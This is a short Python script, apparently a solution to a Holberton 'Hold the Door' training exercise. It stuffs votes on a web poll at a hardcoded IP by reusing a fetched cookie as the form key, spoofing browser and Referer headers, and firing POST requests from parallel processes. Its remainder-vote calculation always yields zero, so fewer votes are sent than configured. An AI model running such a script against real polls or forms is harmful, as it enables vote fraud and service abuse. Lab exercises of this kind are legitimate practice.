#!/usr/bin/python3


from requests import post, get
from multiprocessing import Process

# Number of votes
votes = 23

# Number of voters, be carefull this number depend of pc's memory ram
voters = 10

# Holberton ID
candidate = 5

# This is a url where we want to scraping
url = 'http://158.69.76.135/level2.php'

dict_data = {
    'id': candidate,
    'holdthedoor': 'submit',
    'key': ''
}

dict_cookie = {'HoldTheDoor': ''}

dict_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
        "Referer": url,
    }

if voters > votes:
    raise ValueError("Number of voters can't be greater than votes")

res = post(url)
header = res.cookies
cookie = header.get('HoldTheDoor')

dict_data['key'] = cookie
dict_cookie['HoldTheDoor'] = cookie

n_votes_per_process = votes / voters
print(n_votes_per_process)

if votes % voters != 0:

    manual_vote = (votes // voters) - int(n_votes_per_process)
    print(manual_vote)
    for i in range(manual_vote):
        resp = post(url, data=dict_data, cookies=dict_cookie, headers=dict_header)


n_votes_per_process = int(n_votes_per_process)


def _vote():
    """This function is called when we try to vote"""

    for i in range(n_votes_per_process):
        resp = post(url, data=dict_data, cookies=dict_cookie, headers=dict_header)

if __name__ == '__main__':

    jobs = []

    for i in range(voters):
        p = Process(target=_vote)
        jobs.append(p)
        p.start()
